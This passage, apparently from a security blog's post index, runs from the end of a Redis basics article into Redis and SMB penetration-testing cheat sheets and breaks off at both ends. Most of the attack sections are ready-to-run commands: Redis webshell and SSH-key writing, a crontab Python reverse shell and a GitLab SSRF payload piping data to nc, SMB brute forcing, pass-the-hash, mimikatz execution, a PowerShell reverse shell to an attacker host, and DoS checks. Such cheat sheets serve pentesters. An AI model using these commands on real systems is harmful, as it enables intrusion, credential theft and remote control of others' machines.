are not sorted in any order. You can add or remove members in OO(1) time complexity.Sets are useful when we want to store data where uniqueness matters. For example, storing the number of unique visitors to a website.Sorted SetsWe can sort elements with a Sorted Set value type. Each element will is associated with a number, which we call a score. This determines the order.For example, if we have a key called vegetables, and we want to store carrot and celery as the value. The score of carrot is 10, and celery is 15. Carrot will be first, followed by celery. If the score of two different elements is the same, then we check which String is lexicographically bigger.HashIn Redis, the hash value type is a field-value pair. They are used to represent objects, but can store many elements and are useful for other tasks as well. A hash takes very little space, so you can store millions of objects in a small hash instance. In fact, a hash can store up to (2^32)-1 field-value pairs, which equates to more that 4 billion.Say we want to store the information about the grades of students. The subject can be the key. The value can be a field-value pair, with the field being the student name and the value being the grade of each student.Here is another example to familiarize you with a Redis hash.HMSET user:1000 username antirez password P1pp0 age 34HGETALL user:1000HSET user:1000 password 12345HGETALL user:1000Redis Pentesting Shodan search query : port:6379 Banner GrabbingRedis is a text based protocol, you can just send the command in a socket and the returned values will be readable. Also remember that Redis can run using ssl/tls (but this is very weird).In a regular Redis instance you can just connect using nc or you could also use redis-cli:nc -vn 10.10.10.10 6379redis-cli -h 10.10.10.10 # sudo apt-get install redis-toolsThe first command you could try is info. It may return output with information of the Redis instance or something like the following is returned:-NOAUTH Authentication required.In this last case, this means that you need valid credentials to access the Redis instance.Automatic EnumerationSome automated tools that can help to obtain info from a redis instance:nmap --script redis-info -sV -p 6379 10.10.x.xmsf&gt; use auxiliary/scanner/redis/redis_serverRedis CredentialsBy default Redis can be accessed without credentials. However, it can be configured to support only password, or username + password.It is possible to set a password in redis.conf file with the parameter requirepass or temporary until the service restarts connecting to it and running: config set requirepass p@ss$12E45.Also, a username can be configured in the parameter masteruser inside the redis.conf file.If only password is configured the username used is “default”.Also, note that there is no way to find externally if Redis was configured with only password or username+password.In cases like this one you will need to find valid credentials to interact with Redis so you could try to brute-force it.Redis Password Authentication Bruteforcing Methodsmsf&gt; use auxiliary/scanner/redis/redis_loginnmap --script redis-brute -p 6379 &lt;IP&gt;hydra –P /path/pass.txt &lt;IP&gt; redisIn case you found valid credentials you need to authenticate the session after establishing the connection with the command:AUTH &lt;username&gt; &lt;password&gt;Valid credentials will be responded with: +OKAuthenticated enumerationIf the Redis instance is accepting anonymous connections or you found some valid credentials, you can start enumerating the service with the following commands:INFO[ ... Redis response with info ... ]client list[ ... Redis response with connected clients ... ]CONFIG GET *[ ... Get config ... ] Other Redis commands can be found here and here.Note that the Redis commands of an instance can be renamed or removed in the redis.conf file. For example this line will remove the command FLUSHDB:rename-command FLUSHDB \"\" More about configuring securely a Redis service here: https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04 You can also monitor in real time the Redis commands executed with the command monitor or get the top 25 slowest queries with slowlog get 25 Find more interesting information about more Redis commands here: https://lzone.de/cheat-sheet/RedisDumping DatabaseInside Redis the databases are numbers starting from 0. You can find if anyone is used in the output of the command info inside the “Keyspace” chunk:In that example the database 0 and 1 are being used. Database 0 contains 4 keys and database 1 contains 1. By default Redis will use database 0. In order to dump for example database 1 you need to do:SELECT 1[ ... Indicate the database ... ]KEYS * [ ... Get Keys ... ]GET &lt;KEY&gt;[ ... Get Key ... ]Dump the database with npm redis-dump or python redis-utilsCommon Redis VulnerabilitiesWebshellFrom: http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.htmlYou must know the path of the Web site folder:root@Urahara:~ redis-cli -h 10.10.x.x10.10.x.x:6379&gt; config set dir /usr/share/nginx/htmlOK10.10.x.x:6379&gt; config set dbfilename redis.phpOK10.10.x.x:6379&gt; set test \"&lt;?php phpinfo(); ?&gt;\"OK10.10.x.x:6379&gt; saveOKIf the webshell access exception, you can empty the database after backup and try again, remember to restore the database.SSHIn the output of config get * you could find the home of the redis user (usually /var/lib/redis or /home/redis/.ssh), and knowing this you know where you can write the authenticated_users file to access via ssh with the user redis. If you know the home of other valid user where you have writable permissions you can also abuse it:Generate a ssh public-private key pair on your pc:ssh-keygen -t rsaWrite the public key to a file :(echo -e \"\\n\\n\"; cat ./.ssh/id_rsa.pub; echo -e \"\\n\\n\") &gt; foo.txtImport the file into redis :cat foo.txt | redis-cli -h 10.10.x.x -x set crackitSave the public key to the authorized_keys file on redis server:root@Urahara:~ redis-cli -h 10.10.x.x10.10.x.x:6379&gt; config set dir /home/test/.ssh/OK10.10.x.x:6379&gt; config set dbfilename \"authorized_keys\"OK10.10.x.x:6379&gt; saveOKFinally, you can ssh to the redis server with private key :ssh -i id_rsa test@10.10.x.xThis technique is automated here:GitHub - iw00tr00t/Redis-Server-Exploit: This will give you shell access on the target system if redis server is not configured properly and faced on the internet without any authenticationCrontab 10.10.z.z = Attacker, 10.10.x.x = victim redisroot@Urahara:~ echo -e \"\\n\\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.z.z\\\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\\n\\n\"|redis-cli -h 10.10.x.x -x set 1OKroot@Urahara:~ redis-cli -h 10.10.x.x config set dir /var/spool/cron/crontabs/OKroot@Urahara:~ redis-cli -h 10.10.x.x config set dbfilename rootOKroot@Urahara:~ redis-cli -h 10.10.x.x saveOKThe last example for Ubuntu, for Centos, the above command should be:redis-cli -h 10.10.x.x config set dir /var/spool/cron/This method can also be used to earn bitcoin ：yamLoad Redis ModuleFollowing the instructions from link below you can compile a redis module to execute arbitrary commands.GitHub - n0b0dyCN/RedisModules-ExecuteCommand: Tools, utilities and scripts to help you write redis modules!Then you need some way to upload the compiled moduleLoad the uploaded module at runtime with MODULE LOAD /path/to/mymodule.soList loaded modules to check it was correctly loaded: MODULE LISTExecute commands:127.0.0.1:6379&gt; system.exec \"id\"\"uid=0(root) gid=0(root) groups=0(root)\\n\"127.0.0.1:6379&gt; system.exec \"whoami\"\"root\\n\"127.0.0.1:6379&gt; system.rev 127.0.0.1 9999Unload the module whenever you want: MODULE UNLOAD mymoduleLUA sandbox bypassHere you can see that Redis uses the command EVAL to execute Lua code sandboxed. In the linked post you can see how to abuse it using the dotfile function, but apparently this isn’t no longer possible. Anyway, if you can bypass the Lua sandbox you could execute arbitrary commas on the system. Also, from the same post you can see some options to cause DoS.Master-Slave ModuleThe master redis all operations are automatically synchronized to the slave redis, which means that we can regard the vulnerability redis as a slave redis, connected to the master redis which our own controlled, then we can enter the command to our own redis.master redis : 10.10.y.y #(Hacker's Server)slave redis : 10.10.x.x #(Target Vulnerability Server)#A master-slave connection will be established from the slave redis and the master redis:redis-cli -h 10.1.0.52 -p 6379slaveof 10.10.y.y 6379#Then you can login to the master redis to control the slave redis:redis-cli -h 10.10.y.y -p 6379set mykey helloset mykey2 helloworldSSRF talking to RedisIf you can send clear text request to Redis, you can communicate with it as Redis will read line by line the request and just respond with errors to the lines it doesn’t understand:-ERR wrong number of arguments for 'get' command-ERR unknown command 'Host:'-ERR unknown command 'Accept:'-ERR unknown command 'Accept-Encoding:'-ERR unknown command 'Via:'-ERR unknown command 'Cache-Control:'-ERR unknown command 'Connection:'Therefore, if you find a SSRF vuln in a website and you can control some headers (maybe with a CRLF vuln) or POST parameters, you will be able to send arbitrary commands to Redis.Example: Gitlab SSRF + CRLF to ShellIn Gitlab11.4.7 were discovered a SSRF vulnerability and a CRLF. The SSRF vulnerability was in the import project from URL functionality when creating a new project and allowed to access arbitrary IPs in the form 0:0:0:0:0:ffff:127.0.0.1 (this will access 127.0.0.1), and the CRLF vuln was exploited just adding %0D%0A characters to the URL.Therefore, it was possible to abuse these vulnerabilities to talk to the Redis instance that manages queues from gitlab and abuse those queues to obtain code execution. The Redis queue abuse payload is:multisadd resque:gitlab:queues system_hook_pushlpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'|whoami | nc 192.241.x.x 80\\').read\\\"],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}\"execAnd the URL encode request abusing SSRF and CRLF to execute a whoami and send back the output via nc is:git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git#For some reason (as for the author of https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/ where this info was took from) the exploitation worked with the git scheme and not with the http scheme." }, { "title": "SMB Pentesting Best Practices", "url": "/posts/smb-pentesting-best-practices/", "categories": "pentesting protocols, smb", "tags": "pentesting, smb, best practicies", "date": "2022-06-08 00:00:00 +0300", "snippet": "SMB SMB usually uses ports 445What is SMB?SMB is a network file and resource sharing protocol that uses a client-server model. SMB clients such as PCs on a network connect to SMB servers to access resources such as files and directories or perform tasks like printing over the network.Often, the term CIFS short for Common Internet File System is used interchangeably with SMB. That is because CIFS was a popular Microsoft SMB implementation introduced with Windows 95. Since then, the informal use of CIFS to refer to SMB has remained common.PORT STATE SERVICE VERSION445/tcp open microsoft-ds How SMB WorksAt a high-level, SMB communication is easy to understand. SMB clients connect to an SMB server using the SMB port to access SMB shares. Once they access the SMB shares, clients can do things such as collaborate on files without downloading them to their machines or print using a networked printer.What is an SMB client?An SMB client is the device that accesses resources on an SMB server. For example, within a corporate network, the user PCs that access a shared drive are SMB clients.What is an SMB server?An SMB server is the network server or cluster of servers where SMB shares are stored. The SMB server grants or denies SMB clients access to the shared resources (a.k.a. SMB shares).What is an SMB Share?An SMB share, also known as an SMB file share, is simply a shared resource on an SMB server. Often, an SMB share is a directory, but it can be any shared resource. For example, network printers are often shared using SMB.What is the SMB port?By default, modern implementations of SMB use TCP port 445 as the SMB port. Older SMB implementations (pre-Windows 2000) used SMB port 139.Versions of SMB: Understanding SMB v1, SMB v2, and SMB v3 SMB v1 (SMB1)- The original SMB version. SMB1 began in the 1980s and has gone through multiple iterations. In Windows 95, Microsoft introduced CIFS as a way to implement SMB1. In modern applications, you should NOT use SMB v1 because it is insecure (no encryption, has been exploited in attacks like WannaCry and NotPetya) and inefficient (very “chatty” on networks creating congestion and reduced performance). SMB v2 (SMB2)- SMB2 was introduced with Windows Vista. This version of SMB had significant improvements in performance and simplicity when compared to SMB1. Additionally, SMBv2 offered security enhancements. For example, SMB2.0.2 introduced pre-authentication integrity and SMB2 is not vulnerable to the same WannaCry and NotPeyta exploits that make SMB1 a security risk. SMB v2.1 was introduced with Windows 7 and Server 2008 R2, further improving performance and oplocks (opportunistic locking). SMB v3 (SMB3)- SMB3 which introduced end-to-end SMB encryption and later are the most advanced and secure implementations of SMB. The first release of SMB3 (a.k.a. SMB v3.0) came with Windows 8 and Server 2012. SMB v3.02 was introduced in Windows 8.1 and Server 2012 R2. SMB 3.1.1 the latest SMB protocol was introduced with Windows 10 and Server 2016.Information About SMB Versions SMB Versions OS Build SMB1 Win2000 / XP / 2003 SMB2.0 Vista / 2008 SMB2.1 Win7 / 2008R2 SMB3.0 Win8 / 2012 SMB 3.02 Win8.1 / 2012R2 SMB Pentesting Shodan search query : port:445 #File Shares :\"Authentication: disabled\" port:445 #Specifically domain controllers: \"Authentication: disabled\" NETLOGON SYSVOL -unix port:445 #Concerning files: \"Authentication: disabled\" \"Shared this folder to access QuickBooks files OverNetwork\" -unix port:445 #Search SMB Authentication enabled and SMB version 1 : port:445 country:CA region:NB \"SMB Status Authentication: enabled SMB Version: 1\" #SMB version 1: SM Version 1 Banner GrabbingScan a network searching for hosts:nbtscan -r 10.10.x.x/24SMB version enumeration:msf &gt; use auxiliary/scanner/smb/smb_version# Discover real samba version if hiddensudo ngrep -i -d tap0 ‘s.?a.?m.?b.?a.*[[:digit:]]’ &amp; smbclient -L //10.10.x.xcrackmapexec smb 10.10.x.x nmap -sV -p445 --script smb-protocols 10.10.x.xChallenge Response support status and SMB signing support can be checked:nmap -sV -p445 --script=smb-security-mode 10.10.x.xnmap -sV -p445 --script=smb2-security-mode 10.10.x.xConnection ToolsLinux:smbclientsmbget/usr/share/doc/python-impacket/examples/ python scriptssmbexec.py and psexec.py wmiexec.pysmb4kWindows:net usePossible Credentials Usernames Common Passwords (blank) (blank) guest (blank) Administrator, admin (blank), password, administrator, admin arcserve arcserve, backup tivoli, tmersrvd tivoli, tmersrvd, admin backupexec, backup backupexec, backup, arcada test, lab, demo password, test, lab, demo Obtain Information#Dump interesting informationenum4linux -a -u \"0xhav0c\" -p \"Password123!\" 10.10.x.xnmap --script \"safe or smb-enum-*\" -p 445 10.10.x.x#Connect to the rpcrpcclient -U \"\" -N 10.10.x.x #No credsrpcclient //192.168.x.x -U secybr.local/0xhav0c%754d87d42adabcca32bdb34a876cbffb --pw-nt-hash#You can use querydispinfo and enumdomusers to query user information#Dump user information/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 secybr.local/0xhav0c:'Password123!'@192.168.x.x/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 secybr.local/0xhav0c:'Password123!'@192.168.x.x#Map possible RPC endpoints/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 secybr.local/0xhav0c:'Password123!'@192.168.x.x/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 secybr.local/0xhav0c:'Password123!'@192.168.x.x/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 secybr.local/0xhav0c:'Password123!'@192.168.x.xnmblookup -A 10.10.x.x # Get NetBIOS from IPenum4linux -a -R 500-600,950-1150 10.10.x.x # Enumeration using enum4linux (identifier le nom/domaine + users + shares) ####################List shares####################smbclient -L //10.10.x.xsmbclient -L 10.10.x.x####################Connect####################smbclient \\\\\\\\192.168.x.x\\\\share smbclient -U \"secybr.local\\0xhav0c\" \\\\\\\\10.10.x.x\\\\IPC$ password # Connectsmbclient -U \"\" -N \\\\\\\\10.10.x.x\\\\IPC$ # Specify username and no pass####################Nullinux for users and shares#####################Installationgit clone https://github.com/m8r0wn/nullinuxcd nullinuxsudo bash setup.sh# Usagepython3 nullinux.py -users -quick secybr.localpython3 nullinux.py 192.168.x.x/24python3 nullinux.py -u 'secybr.local\\0xhav0c' -p 'Password123!' 10.10.x.x# Other Enumeration Commandssmbmap -u 0xhav0c -p Password123! -d secybr.local -H 192.168.x.x # Smbmap for domains (List share drives, drive permissions, share contents, upload/download functionality..) | Basic enumeration (password or NTLM hash)smbmap -u '0xhav0c' -p 'Password123!' -d secybr.com -H 10.10.x.x -x 'net group \"Domain Admins\" /domain' # Remote command executionsmbmap -H 10.10.x.x -u 0xhav0c -p 'Password123!' -r 'C$\\Users' # Non-recursive path listingsmbmap --host-file AD-HOSTS.txt -u 0xhav0c -p 'Password123!' -d secybr.com -F 'password'# File content searching !!! It's not working stabil. smbmap -H 192.168.x.x -u 0xhav0c -p 'Password123!' -d secybr.com -L # Drive listing##################### Nifty Shell####################python smbmap.py -u 0xhav0c -p 'Password123!' -d secybr.local -H 192.168.x.x -x 'powershell -command \"function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=\"\"\"\"192.168.y.y\"\"\"\"; $port=\"\"\"\"1337\"\"\"\";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize ;$p=New-Object System.Diagnostics.Process ;$p.StartInfo.FileName=\"\"\"\"cmd.exe\"\"\"\" ;$p.StartInfo.RedirectStandardInput=1 ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0 ;$p.Start() ;$is=$p.StandardInput ;$os=$p.StandardOutput ;Start-Sleep 1 ;$e=new-object System.Text.AsciiEncoding ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length) ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}} if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else { $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out=\"\"\"\" \"\"\"\"}} $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};\"' nc -l 4445 # Listener for atacker MachineEnumerating LSARPC and SAMR with rpcclientYou can use the Samba rpcclient utility to interact with RPC endpoints via named pipes. The following lists commands that you can issue to SAMR, LSARPC, and LSARPC-DS interfaces upon establishing a SMB session (often requiring credentials).#Users enumerationList users: querydispinfo and enumdomusersGet user details: queryuser &lt;0xrid&gt;Get user groups: queryusergroups &lt;0xrid&gt;GET SID of a user: lookupnames &lt;username&gt;Get users aliases: queryuseraliases [builtin|domain] &lt;sid&gt;#Groups enumerationList groups: enumdomgroupsGet group details: querygroup &lt;0xrid&gt;Get group members: querygroupmem &lt;0xrid&gt;#Aliasgroups enumerationList alias: enumalsgroups &lt;builtin|domain&gt;Get members: queryaliasmem builtin|domain &lt;0xrid&gt;#Domains enumerationList domains: enumdomainsGet SID: lsaqueryDomain info: querydominfo#More SIDsFind SIDs by name: lookupnames &lt;username&gt;Find more SIDs: lsaenumsidRID cycling (check more SIDs): lookupsids &lt;sid&gt;Create Fake SMB Shares for Capture the Credentialspython3 smbserver.py 0xhav0c /File/path/to/share/folder # 0xhav0c == Share Name fake smb server for the capture credentialsSMB Enumeration Scripts with Nmapnmap -sV -p445 --script=smb-mbenum 10.10.x.x # Master Browser information can be listed.nmap -sV -p445 --script=smb-os-discovery 10.10.x.x # Operating system version information can be obtained.nmap -sV -p445 --script=smb-protocols 10.10.x.x # According to the answers to the sent queries, the protocols of the SMB version can be detected.nmap -sV -p445 --script=smb2-capabilities 10.10.x.x # According to the answers to the sent queries, the protocols of the SMB version can be detected.nmap -sV -p445 --script=smb-enum-domains 10.10.x.xnmap -sV -p445 --script=smb-enum-groups 10.10.x.xnmap -sV -p445 --script=smb-enum-processes 10.10.x.xnmap -sV -p445 --script=smb-enum-sessions 10.10.x.xnmap -sV -p445 --script=smb-server-stats 10.10.x.xnmap -sV -p445 --script=smb-system-info 10.10.x.xOS Detection with SMB OS Discovery scriptThe content of anonymous shares (NULL Session) can be listed.smbclient -L 10.10.x.x -Nsmbmap -H 10.10.x.xsmbmap -H 10.10.x.x -Rnet use \\\\10.10.x.x\\IPC$ \"\" /u:\"\"rpcclient 10.10.x.x -U \"\" -NShares and authorization can be listed with Guest authorization.smbget -a smb://10.10.x.x/SharedFolder -RDownload the anonymous shares (NULL Session)If you have the necessary privileges after running the command below, you can download the files in that file..smbmap -H 192.168.x.xFirst, let’s access the shared file.smbclient -N \\\\\\\\192.168.x.x\\\\shared_folderWhen using smbclient to copy a directory, make sure to use the recurse and prompt commands. This makes it possible to non-interactively copy a directory and all of its contents. Then let’s run the following commands. Caution will download all the files. Run smbclient in the directory where you will download the files.smb: \\&gt; promptsmb: \\&gt; recursesmb: \\&gt; mget *Shared printers can be detected.net view \\\\10.10.x.xPrintable on shared printers.nmap -sV -p445 --script=smb-print-textThe system clock and the initial start time of the SMB service can be determined.nmap -sV -p445 --script=smb2-timeBackdoors left on the computer can be listed.nmap -sV -p445 --script=stuxnet-detectnmap -sV -p445 --script=smb-double-pulsar-backdoorUsernames can be detected with the RID technique.crackmapexec smb 10.10.x.0/24 -d Domain -u Usernames.list -p Password.list –rid-brutenmap -sV -p445 --script=smb-enum-usersmsf &gt; use auxiliary/scanner/smb/smb_lookupsidA general information gathering can be carried out. Obtain SMB server version, domain name, Nbtstat info, MAC address, operating system, users (querydispinfo and enumdomusers), shared directories, anonymous sharing control, password policy (via rpcclient), groups, members of groups, RID and SID info,… can be done.enum4linux -a 10.10.x.xThe SMB service can be started. Thus, by listening to the network, the NTLM/LM password hashes of the users on the network and the encrypted Challenge values can be collected.msf &gt; use auxiliary/server/capture/smbmsf &gt; use auxiliary/spoof/nbns/nbns_responseValid users or passwords that can be logged in can be detected.nmap -sV -p445 --script=smb-brute --script-args userdb=Usernames.list,passdb=Passwords.list,smblockout=1msf &gt; use auxiliary/scanner/smb/smb_loginhydra -t 2 -L Usernames.list -P Passwords.list -M IPAdresses.list -s TargetPort smbmedusa -t 2 -T 2 -U Usernames.list -P Passwords.list -H IPAdresses.list -n TargetPort -M smbntcrackmapexec smb 10.10.x.x/24 -d secybr.local -u Usernames.list -p Passwords.listValid login users or password hashes can be identified.msf &gt; use auxiliary/scanner/smb/smb_loginhydra -t 2 -L Usernames.list -P Hashes.list -M TargetIPAdresses.list -s TargetPort -m \"LocalHash\" smbmedusa -t 2 -T 2 -U Usernames.list -P Hashes.list -H TargetIPAdresses.list -n TargetPort -m PASS:HASH -M smbntcrackmapexec smb 10.10.x.x/24 -d secybr.local -u Usernames.list -H Hashes.listDetailed information collection can be performed using identity information.enum4linux -u secybr.local\\\\0xhav0c -p 'Password123!' -a 10.10.x.xShares can be listed using credentials.nmap -sV -p445 --script=smb-enum-shares --script-args smbdomain=secybr.local,smbuser=0xhav0c,smbpass='Password123!' 10.10.x.xnmap -sV -p445 --script=smb-ls --script-args smbdomain=secybr.local,smbuser=0xhav0c,smbpass='Password123!',share=’SharedFolder’ 10.10.x.xnmap -sV -p445 --script=smb-enum-shares,smb-ls --script-args smbdomain=secybr.local,smbuser=0xhav0c,smbpass='Password123!' 10.10.x.xmsf&gt; use auxiliary/scanner/smb/smb_enumsharessmbclient //10.10.x.x/SharedFolder -U secybr.local\\\\0xhav0csmbmap –host-file /path/to/TargetIPAddresses.list -d secybr.local -u 0xhav0c -p 'Password123!' -Rsmbmap -H 10.10.x.x -R SharedFolder -A SearchingFileNamepth-smbclient -U secybr.local/0xhav0c%aad3b435b51404eeaad3b435b51404ee //10.10.x.x/SharedFoldercrackmapexec smb 10.10.x.x/24 -d secybr.local -u 0xhav0c -p 'Password123!' --sharescrackmapexec smb 10.10.x.x/24 -d secybr.local -u 0xhav0c -H '53f587baed383d5e8969457609f80a33333331a22a7e651:1b7951d1ee9e3363' --sharesaccessing and downloading the known shared file with smbclientdetecting shares, searching and downloading the known shared file with smbmapData from the share can be downloaded using credentials.msf &gt; use post/windows/gather/enum_sharessmbget smb://10.10.x.x/SharedFolder –user=secybr.local\\\\0xhav0c -Rmount -t cifs -o username=0xhav0c,password=Password123!,domain=secybr.local //10.10.x.x/SharedFolder /root/Desktop/SharedFilesmbmount //10.10.x.x/SharedFolder /root/Desktop/SharedFile -o username=0xhav0c,password=Password123!,rwnet use T: \\\\10.10.x.x\\SharedFolder Password123! /user:secybr.local\\0xhav0c /savecred /p:noLocal (and the domain the computer is in) users can be listed using their credentials.nmap -sV -p445 --script=smb-enum-users --script-args smbdomain=secybr.local,smbuser=0xhav0c,smbpass=Password123! 10.10.x.xmsf &gt; use auxiliary/scanner/smb/smb_enumusersmsf &gt; use auxiliary/scanner/smb/smb_enumusers_domainLocal groups can be listed using credentials.nmap -sV -p445 --script=smb-enum-groups --script-args smbdomain=secybr.local,smbuser=0xhav0c,smbpass=Password123! 10.10.x.xSome other information gathering methods.#Password policy, users,… etc. about domain using credentials. information can be listed.nmap -sV -p445 --script=smb-enum-domains --script-args smbdomain=secybr.local,smbuser=0xhav0c,smbpass=Password123! 10.10.x.x #Operating system information, hardware, web browser, … etc., using credentials. information can be listed.nmap -sV -p445 --script=smb-system-info --script-args smbdomain=secybr.local,smbuser=0xhav0c,smbpass=Password123! 10.10.x.x #Pipe information named using credentials can be listed.msf &gt; use auxiliary/scanner/smb/pipe_auditor#By using credentials, process information running in the operating system can be listed.nmap -sV -p445 --script=smb-enum-processes --script-args smbdomain=secybr.local,smbuser=0xhav0c,smbpass=Password123! 10.10.x.x #Using the credentials, the service information running in the operating system can be listed.nmap -sV -p445 --script=smb-enum-services --script-args smbdomain=secybr.local,smbuser=0xhav0c,smbpass=Password123! 10.10.x.x #Users who have logged in (in systems where local administrator authority can be obtained) can be listed using the username and password (or password summary) information.nmap -sV -p445 --script=smb-enum-sessions --script-args smbdomain=secybr.local,smbuser=0xhav0c,smbpass=Password123! 10.10.x.x msf &gt; use auxiliary/scanner/smb/psexec_loggedin_userscrackmapexec smb 10.10.x.x/24 -C UsernamePassword.list –lusers#Operating system SMB server statistics information can be listed using the credentialsnmap -sV -p445 --script=smb-server-stats --script-args smbdomain=secybr.local,smbuser=0xhav0c,smbpass=Password123! 10.10.x.x#By using the credentials, the passwords registered in the Group Policy Preference in the domain the computer belongs to can be determined.msf &gt; use auxiliary/scanner/smb/smb_enum_gppFiles on the SMB share can be retrieved using credentials.smbclient //10.10.x.x/SharedFolder -U 'secybr.local\\\\0xhav0c' 'Password123!' -p TargetPortrecurse ONprompt OFFmget *Access to the MS-RPC command line can be achieved using credentials.rpcclient 10.10.x.x -U 'secybr.local\\\\0xhav0c'Command can be run by using username and password information (in systems where local administrator authority can be obtained).nmap -sV -p445 --script=smb-psexec.nse --script-args=smbuser=Username.list,smbpass=Password.list 10.10.x.xsmbmap –host-file /FullPath/TargetIP.list -d secybr.local -u 0xhav0c -p 'Password123!' -x \"net user\"winexe -U secybr.local\\\\0xhav0c%Password123! //10.10.x.x \"net user\"crackmapexec smb 10.10.x.x -u Username -p Password -M mimikatz -o COMMAND=privilege::debugcrackmapexec smb 10.10.x.x -u Username -H '53f587baed383d5e8969457609f80sdfdsfdsfsda22a7e651:1b7951d1ee9e3363' -M mimikatz -o COMMAND=privilege::debugexecuting Mimikatz script from crackmapexecAccess to the Windows command line (Meterpreter, CMD, Powershell, …) can be achieved by using the username and password information (in systems where local administrator authority can be obtained).winexe -U secybr.local\\\\Username%Password //10.10.x.x \"cmd.exe\" –systempth-winexe -U secybr.local/0xhav0c%aad3b435b51404eeaad3b435b51404ee //10.10.x.x cmd.exe –system#Metasploit Frameworkmsf &gt; use exploit/windows/smb/psexecmsf &gt; use exploit/windows/smb/psexec_pshmsf &gt; use exploit/windows/smb/smb_delivery#Impacketspython psexec.py secybr.local/0xhav0c:Password123!@10.10.x.xpython smbexec.py secybr.local/0xhav0c:Password123!@10.10.x.xpython wmiexec.py secybr.local/0xhav0c:Password123!@10.10.x.x#Windows Sysinternals: psexec.exe \\\\10.10.x.x -u secybr.local\\0xhav0c -p Password cmd.exe /accepteulaAccess to the Windows command line (Meterpreter, CMD, Powershell, …) can be achieved by using the username and password summary information (in systems where local administrator authority can be obtained).pth-winexe -U secybr.local\\\\0xhav0c%aad3b435b51404eeaad3b435b51404ee //10.10.x.x \"cmd.exe\" –system#Metasploit Frameworkmsf &gt; use exploit/windows/smb/psexecmsf &gt; use exploit/windows/smb/psexec_psh#Impacketspython psexec.py secybr.local/0xhav0c@10.10.x.x -hashes 00000000000000000000000000000000:4a09d6777d034c2a5fced85d044a98e3python smbexec.py secybr.local/0xhav0c@10.10.x.x -hashes 00000000000000000000000000000000:4a09d6777d034c2a5fced85d044a98e3python wmiexec.py secybr.local/0xhav0c@10.10.x.x -hashes 00000000000000000000000000000000:4a09d6777d034c2a5fced85d044a98e3Common SMB VulnerabilitiesDOS vulnerabilities using this service can be detected.#MS09-050: Microsoft Windows SMB2 _Smb2ValidateProviderCallback() Vulnerability (975497) (uncredentialed check) [CVE-2009-2526]nmap -sV -p445 --script=smb-vuln-cve2009-3103 10.10.x.xnmap -sV -p445 --script=smb-vuln-cve2009-3103 --script-args unsafe=1 10.10.x.xmsf &gt; use auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh 10.10.x.xmsf &gt; use exploit/windows/smb/ms09_050_smb2_negotiate_func_index 10.10.x.x#MS10-006: Vulnerabilities in SMB Client Could Allow Remote Code Execution (978251)msf &gt; use auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop#MS10-054: Vulnerabilities in SMB Server Could Allow Remote Code Execution (982214) [CVE-2010-2551] [CVE-2010-2552] (Remote Memory Corruption. Result is BSOD -&gt; DANGEROUS)nmap -sV -p445 --script=smb-vuln-ms10-054 --script-args unsafe=1 10.10.x.x#Service regsvc vulnerability [CVE-2010-2550]nmap -sV -p445 --script=smb-vuln-regsvc-dos 10.10.x.x#SMB DOSnmap -sV -p445 --script=smb-flood --script-args smbdomain=Domain,smbuser=Username,smbpass=Password 10.10.x.xVarious vulnerable systems using this service can be detected.#MS03-026: Buffer Overrun In RPC Interface Could Allow Code Execution (823980) [CAN-2003-0352]Exploit-DB: 66.c#MS06-025: Vulnerability in Routing and Remote Access Could Allow Remote Code Execution (911280) [CVE-2006-2370] (Buffer overflow in 